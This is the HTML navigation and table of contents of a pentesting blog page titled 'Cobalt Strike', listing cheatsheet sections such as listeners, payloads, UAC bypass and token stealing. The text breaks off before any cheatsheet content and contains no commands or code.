
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Projects Showcase">
      
      
      
        <link rel="canonical" href="http://blog.cuhawk.co.uk/pentesting/cobalt/">
      
      
        <link rel="prev" href="../relaying/">
      
      
        <link rel="next" href="../../certifications/oscp/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.27">
    
    
      
        <title>Cobalt Strike - Cuhawk's Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.6543a935.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#cobalt-strike-cheatsheet" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Cuhawk&#39;s Blog" class="md-header__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Cuhawk's Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Cobalt Strike
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../programming/" class="md-tabs__link">
          
  
  Programming

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../" class="md-tabs__link">
          
  
  Pentesting

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../certifications/oscp/" class="md-tabs__link">
          
  
  Certifications

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Cuhawk&#39;s Blog" class="md-nav__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Cuhawk's Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Programming
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Programming
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/DSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DFS vs BFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Sorting%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sorting Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Tree%20Use%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tree Use Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Snake/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Snake C++
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Booking%20API%20C%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Booking API
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/GameServer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Game Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Milk%20App%20c%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Milk Storage C#
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Pentesting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Pentesting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Evasion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux AD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../relaying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Relaying
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#general" class="md-nav__link">
    <span class="md-ellipsis">
      General
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-current-user" class="md-nav__link">
    <span class="md-ellipsis">
      Get current user
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-sleep-set-interactive" class="md-nav__link">
    <span class="md-ellipsis">
      Change sleep / Set interactive
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-metadata-from-beacon" class="md-nav__link">
    <span class="md-ellipsis">
      Get metadata from beacon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kill-a-beacon" class="md-nav__link">
    <span class="md-ellipsis">
      Kill a beacon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upload-and-download-files" class="md-nav__link">
    <span class="md-ellipsis">
      Upload and download files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#take-screenshots" class="md-nav__link">
    <span class="md-ellipsis">
      Take screenshots
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#keylogger" class="md-nav__link">
    <span class="md-ellipsis">
      Keylogger
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webserver" class="md-nav__link">
    <span class="md-ellipsis">
      Webserver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Webserver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#upload-file" class="md-nav__link">
    <span class="md-ellipsis">
      Upload file
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-web-logs" class="md-nav__link">
    <span class="md-ellipsis">
      Check web logs
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#teamserver" class="md-nav__link">
    <span class="md-ellipsis">
      Teamserver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Teamserver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#start-teamserver" class="md-nav__link">
    <span class="md-ellipsis">
      Start teamserver
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#teamserver-service" class="md-nav__link">
    <span class="md-ellipsis">
      Teamserver service
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Teamserver service">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-service" class="md-nav__link">
    <span class="md-ellipsis">
      Create service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reload-service" class="md-nav__link">
    <span class="md-ellipsis">
      Reload service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#start-service" class="md-nav__link">
    <span class="md-ellipsis">
      Start service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-service" class="md-nav__link">
    <span class="md-ellipsis">
      Enable service
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistend-hosted-files" class="md-nav__link">
    <span class="md-ellipsis">
      Persistend hosted files
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Persistend hosted files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-to-startup-service" class="md-nav__link">
    <span class="md-ellipsis">
      Add to startup service
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listeners" class="md-nav__link">
    <span class="md-ellipsis">
      Listeners
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-a-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Create a listener
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Create a listener">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-peer-to-peer-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Create peer-to-peer listener
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-pivot-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Create pivot listener
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Create pivot listener">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connect-to-pivot-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Connect to pivot listener
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#opsec-listeners" class="md-nav__link">
    <span class="md-ellipsis">
      OPSEC listeners
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Payloads
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Create payloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-payload" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell payload
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-dll-payload" class="md-nav__link">
    <span class="md-ellipsis">
      Create dll payload
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-service-binary" class="md-nav__link">
    <span class="md-ellipsis">
      Create service binary
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#opsec-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      OPSEC payloads
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Command Execution
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Command Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execute-cmd-command" class="md-nav__link">
    <span class="md-ellipsis">
      Execute cmd command
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-powershell-command" class="md-nav__link">
    <span class="md-ellipsis">
      Execute PowerShell command
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-powershell-command-through-powerpick" class="md-nav__link">
    <span class="md-ellipsis">
      Execute PowerShell command through powerpick
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-assembly-in-memory" class="md-nav__link">
    <span class="md-ellipsis">
      Execute assembly in memory
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#load-powershell-script" class="md-nav__link">
    <span class="md-ellipsis">
      Load PowerShell script
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#uac-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      UAC Bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="UAC Bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#uac-bypass_1" class="md-nav__link">
    <span class="md-ellipsis">
      UAC bypass
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uac-bypass-method-2-runasadmin" class="md-nav__link">
    <span class="md-ellipsis">
      UAC bypass method 2 runasadmin
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      Lateral Movement
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lateral Movement">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#portscan" class="md-nav__link">
    <span class="md-ellipsis">
      Portscan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-impersonation" class="md-nav__link">
    <span class="md-ellipsis">
      User impersonation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="User impersonation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#make-token-runas-other-user" class="md-nav__link">
    <span class="md-ellipsis">
      Make token - runas other user
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rev2self" class="md-nav__link">
    <span class="md-ellipsis">
      Rev2self
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#steal-token" class="md-nav__link">
    <span class="md-ellipsis">
      Steal token
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Certifications
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Certifications
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/oscp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSCP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/osep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSEP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/crte/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CRTE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/prolabs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB ProLabs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#general" class="md-nav__link">
    <span class="md-ellipsis">
      General
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-current-user" class="md-nav__link">
    <span class="md-ellipsis">
      Get current user
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-sleep-set-interactive" class="md-nav__link">
    <span class="md-ellipsis">
      Change sleep / Set interactive
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-metadata-from-beacon" class="md-nav__link">
    <span class="md-ellipsis">
      Get metadata from beacon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kill-a-beacon" class="md-nav__link">
    <span class="md-ellipsis">
      Kill a beacon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upload-and-download-files" class="md-nav__link">
    <span class="md-ellipsis">
      Upload and download files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#take-screenshots" class="md-nav__link">
    <span class="md-ellipsis">
      Take screenshots
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#keylogger" class="md-nav__link">
    <span class="md-ellipsis">
      Keylogger
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webserver" class="md-nav__link">
    <span class="md-ellipsis">
      Webserver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Webserver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#upload-file" class="md-nav__link">
    <span class="md-ellipsis">
      Upload file
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-web-logs" class="md-nav__link">
    <span class="md-ellipsis">
      Check web logs
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#teamserver" class="md-nav__link">
    <span class="md-ellipsis">
      Teamserver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Teamserver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#start-teamserver" class="md-nav__link">
    <span class="md-ellipsis">
      Start teamserver
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#teamserver-service" class="md-nav__link">
    <span class="md-ellipsis">
      Teamserver service
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Teamserver service">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-service" class="md-nav__link">
    <span class="md-ellipsis">
      Create service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reload-service" class="md-nav__link">
    <span class="md-ellipsis">
      Reload service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#start-service" class="md-nav__link">
    <span class="md-ellipsis">
      Start service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-service" class="md-nav__link">
    <span class="md-ellipsis">
      Enable service
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistend-hosted-files" class="md-nav__link">
    <span class="md-ellipsis">
      Persistend hosted files
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Persistend hosted files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-to-startup-service" class="md-nav__link">
    <span class="md-ellipsis">
      Add to startup service
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listeners" class="md-nav__link">
    <span class="md-ellipsis">
      Listeners
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-a-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Create a listener
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Create a listener">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-peer-to-peer-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Create peer-to-peer listener
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-pivot-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Create pivot listener
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Create pivot listener">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connect-to-pivot-listener" class="md-nav__link">
    <span class="md-ellipsis">
      Connect to pivot listener
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#opsec-listeners" class="md-nav__link">
    <span class="md-ellipsis">
      OPSEC listeners
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Payloads
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Create payloads
    </span>
  </a>
  
</li>
        
